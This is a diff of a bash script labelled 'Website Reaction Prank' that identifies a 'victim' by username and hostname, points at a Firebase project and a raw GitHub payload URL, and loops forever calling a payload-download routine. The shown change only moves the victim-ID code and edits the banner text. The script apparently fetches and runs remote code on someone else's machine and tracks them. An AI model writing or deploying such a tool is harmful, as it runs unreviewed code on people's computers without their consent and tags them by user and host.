@@ -3,12 +3,8 @@
 
 SCRIPTDIR=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )
 
-victim="$1"
-if [ -z "$victim" ]; then
-  victim="$USER.`hostname`"
-fi
+###################################################################
 
-victim="`echo $victim | tr '.#[]/$' '______'`"
 firebaseProject="prankproject-cb680"
 payloadPrefix="https://raw.githubusercontent.com/thiesgehrmann/"
 
@@ -136,17 +132,20 @@ function runPayload() {
 # Only perform the next steps if we are not being sourced
 if [ "${BASH_SOURCE[0]}" == "${0}" ]; then
 
-  echo "#################################"
-  echo "# Website Reaction Prank         "
-  echo "# VictimID: $victim              "
-  echo "#################################"
-  
+  victim="$1"
+  if [ -z "$victim" ]; then
+    victim="$USER.`hostname`"
+  fi
+  victim="`echo $victim | tr '.#[]/$' '______'`"
+
   iteration=1
   
   while [ true ]; do
   
     echo "###################################"
-    echo "Iteration $iteration"
+    echo "# Website Reaction Prank         "
+    echo "# VictimID: $victim              "
+    echo "# Iteration $iteration"
     echo ""
   
     downloadPayloadIfNeeded
